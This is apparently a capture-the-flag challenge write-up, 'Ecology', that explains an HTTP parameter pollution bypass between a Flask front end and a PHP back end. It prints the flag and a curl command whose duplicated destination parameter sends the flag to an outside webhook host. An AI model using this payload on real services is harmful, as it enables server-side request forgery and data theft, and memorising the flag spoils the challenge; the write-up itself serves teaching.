# Ecology

**Author** : Dušan Lazić

**Difficulty** : Medium

**Description** : This service shares the flag only with the internal services, right?

**Flag** : `SCC{p4ram3t3r_p0llu7i0n_i5_fuN}`

# Solution

HTTP parameter pollution. Flask reads and checks only the first parameter, while PHP on the back reads only the last one.

```
curl --path-as-is "http://chall:5000/?destination=http://127.0.0.1&destination=http://webhook.site/..."
```
